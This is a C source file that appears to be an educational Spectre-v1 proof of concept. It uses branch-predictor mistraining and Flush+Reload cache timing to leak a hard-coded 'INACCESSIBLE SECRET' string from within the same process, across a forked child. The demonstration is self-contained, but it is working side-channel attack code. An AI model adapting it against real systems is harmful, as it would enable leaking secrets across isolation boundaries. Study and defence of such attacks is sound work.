#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include <unistd.h>
#define DATA "data|"
#define SECRET "INACCESSIBLE SECRET"
#define TEXT DATA SECRET
#define PAGE_SIZE 4096

static size_t CACHE_MISS = 0;
unsigned char array1[128];
char *mem = NULL;

void maccess(void *p) { __asm__ volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void cache_encode(char index)
{
    maccess(mem + index * PAGE_SIZE);
}

char victim(int x)
{
    size_t len = sizeof(DATA) - 1;
    _mm_mfence();
    _mm_clflush(&len);
    _mm_clflush(&x);
    _mm_mfence();

    if ((float)x / (float)len < 1)
    {
        cache_encode(array1[x]);
    }
}

void train_branch_predictor()
{
    for (int y = 0; y < 10; y++)
    {
        victim(0);
    }
}

void cache_detect(char *leaked, int index)
{
    unsigned int aux;
    uint64_t start, end;
    int mix_i;
    for (int i = 0; i < 256; i++)
    {
        // 伪随机顺序访问，防止被预测
        mix_i = ((i * 167) + 13) & 255;
        start = __rdtscp(&aux);
        maccess(mem + mix_i * PAGE_SIZE);
        end = __rdtscp(&aux);
        _mm_mfence();
        _mm_clflush(mem + mix_i * PAGE_SIZE);
        if (end - start < CACHE_MISS)
        {
            if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ')
            {
                leaked[index] = mix_i;
                printf("\x1b[33m%s\x1b[0m\r", leaked);
            }
        }
        fflush(stdout);
        sched_yield();
    }
}

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        _mm_clflush(mem + i * PAGE_SIZE);
    }
}

int reload_t(void *ptr)
{
    unsigned int aux;
    uint64_t start = 0, end = 0;
    _mm_mfence();
    start = __rdtscp(&aux);
    maccess(ptr);
    end = __rdtscp(&aux);
    _mm_mfence();
    return (int)(end - start);
}

int flush_reload_t(void *ptr)
{
    unsigned int aux;
    uint64_t start = 0, end = 0;
    _mm_mfence();
    start = __rdtscp(&aux);
    maccess(ptr);
    end = __rdtscp(&aux);
    _mm_mfence();
    _mm_clflush(ptr);
    return (int)(end - start);
}

size_t detect_flush_reload_threshold()
{
    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
    size_t dummy[16];
    size_t *ptr = dummy + 8;

    maccess(ptr);
    for (i = 0; i < count; i++)
    {
        reload_time += reload_t(ptr);
    }
    for (i = 0; i < count; i++)
    {
        flush_reload_time += flush_reload_t(ptr);
    }
    reload_time /= count;
    flush_reload_time /= count;

    return (flush_reload_time + reload_time * 2) / 3;
}

int main(int argc, const char **argv)
{
    if (!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    CACHE_MISS = CACHE_MISS < 80 ? CACHE_MISS:80; // 设置一个最小阈值
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    char *_mem = malloc(PAGE_SIZE * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(PAGE_SIZE - 1)) + PAGE_SIZE * 2);

    pid_t pid = fork();
    memset(mem, pid, PAGE_SIZE * 256);

    memset(array1, ' ', sizeof(array1));
    memcpy(array1, TEXT, sizeof(TEXT));

    array1[sizeof(array1) / sizeof(array1[0]) - 1] = '0';

    flush_cache();

    char leaked[sizeof(TEXT) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(TEXT)] = 0;

    int j = 0;
    while (1)
    {
        j = (j + 1) % sizeof(TEXT);

        if (pid == 0)
        {
            train_branch_predictor();
        }
        else
        {
            victim(j);
            if (j >= sizeof(DATA) - 1)
            {
                _mm_mfence();
                cache_detect(leaked, j);
            }
            if (!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
                break;
            sched_yield();
        }
    }
    free(_mem);
    printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
    return 0;
}